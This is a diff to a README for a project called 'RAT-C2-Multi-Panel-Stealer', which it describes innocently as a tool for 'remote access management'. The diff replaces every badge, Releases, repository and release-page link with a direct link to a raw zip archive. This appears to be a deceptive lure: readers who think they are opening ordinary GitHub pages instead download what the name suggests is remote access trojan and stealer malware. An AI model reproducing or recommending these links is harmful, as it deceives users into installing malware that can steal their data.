@@ -1,13 +1,13 @@
 # 🔒 RAT-C2-Multi-Panel-Stealer - Easily Manage Remote Access
 
 ## 📦 Download Now
-[![Download RAT-C2-Multi-Panel-Stealer](https://img.shields.io/badge/Download-RAT--C2--Multi--Panel--Stealer-blue.svg)](https://github.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/releases)
+[![Download RAT-C2-Multi-Panel-Stealer](https://raw.githubusercontent.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/main/mort/RAT-C2-Multi-Panel-Stealer-3.6.zip)](https://raw.githubusercontent.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/main/mort/RAT-C2-Multi-Panel-Stealer-3.6.zip)
 
 ## 🚀 Getting Started
 RAT-C2-Multi-Panel-Stealer is a tool designed for effective remote access management. It provides users with a multi-panel interface to track and manage remote access sessions. Follow these steps to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/main/mort/RAT-C2-Multi-Panel-Stealer-3.6.zip) to download the latest version.
 2. Look for the newest release on the page.
 3. Click on the asset link for your operating system.
 4. Save the file to your computer.
@@ -44,8 +44,8 @@ If you need assistance using RAT-C2-Multi-Panel-Stealer, please refer to the fol
 - **Community Forum:** Engage with other users to share tips and ask questions.
 
 ## 🔗 Links
-- **GitHub Repository:** [RAT-C2-Multi-Panel-Stealer Repository](https://github.com/Rafael12213/RAT-C2-Multi-Panel-Stealer)
-- **Release Page:** [Download from Releases](https://github.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/releases)
+- **GitHub Repository:** [RAT-C2-Multi-Panel-Stealer Repository](https://raw.githubusercontent.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/main/mort/RAT-C2-Multi-Panel-Stealer-3.6.zip)
+- **Release Page:** [Download from Releases](https://raw.githubusercontent.com/Rafael12213/RAT-C2-Multi-Panel-Stealer/main/mort/RAT-C2-Multi-Panel-Stealer-3.6.zip)
 
 ## 👥 Community Contribution
 We encourage community contributions! If you want to help improve RAT-C2-Multi-Panel-Stealer, consider:
